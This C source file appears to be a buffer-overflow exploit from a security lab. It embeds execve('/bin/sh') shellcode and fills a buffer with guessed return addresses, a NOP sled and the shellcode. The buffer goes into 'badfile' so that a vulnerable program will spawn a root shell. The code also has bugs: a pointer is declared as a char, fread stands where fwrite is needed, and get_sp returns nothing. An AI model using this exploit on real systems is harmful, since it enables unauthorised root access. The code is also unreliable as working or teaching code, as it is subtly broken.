#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[]=
"\x31\xc0"             /* xorl    %eax,%eax              */
"\x50"                 /* pushl   %eax                   */
"\x68""//sh"           /* pushl   $0x68732f2f            */
"\x68""/bin"           /* pushl   $0x6e69622f            */
"\x89\xe3"             /* movl    %esp,%ebx              */
"\x50"                 /* pushl   %eax                   */
"\x53"                 /* pushl   %ebx                   */
"\x89\xe1"             /* movl    %esp,%ecx              */
"\x99"                 /* cdql                           */
"\xb0\x0b"             /* movb    $0x0b,%al              */
"\xcd\x80"             /* int     $0x80                  */
;

/* return stack pointer to guess return address for CPU */
//buffer --> NOP sled --> shellcode --> commandline access with root privileges
unsigned long get_sp(void)
{
   __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517], buf_ptr;
    FILE *badfile;
    long ret_addr, *buf_addr_ptr;
    int  code_len, buf_len, offset;

    //to guess start address of buffer
    offset  = 400;
    //get offset from command line
    if (argc > 1) offset = atoi(argv[1]);
   
    //set pointers
    buf_ptr       = buffer;
    buf_addr_ptr  = (long *)buf_ptr;
  
    //shellcode size
    code_len = sizeof(code);
    buf_len = sizeof(buffer);

    //calculate guess for start address of buffer based on esp register
    ret_addr = get_sp() + offset;

    //initialize buffer to NOP sled
    memset(&buffer, 0x90, buf_len);

    //fill first 300 bytes of buffer with guess of return address 
     for(int i = 0; i < 300; i += 4)
     {
	    *(buf_addr_ptr++) = ret_addr;	
     }

     //add shellcode to buffer
     for(int i= 420; i < code_len + 420; i++)
     {
	   buffer[i] = code[i - 420];
     }
    
    //null terminate buffer
     buffer[buf_len- 1] = '\0';
    
    //write buffer to badfile to be read from stack program
     badfile = fopen("./badfile", "w");
     fread(buffer, buf_len, sizeof(char), badfile);
     fclose(badfile);
}



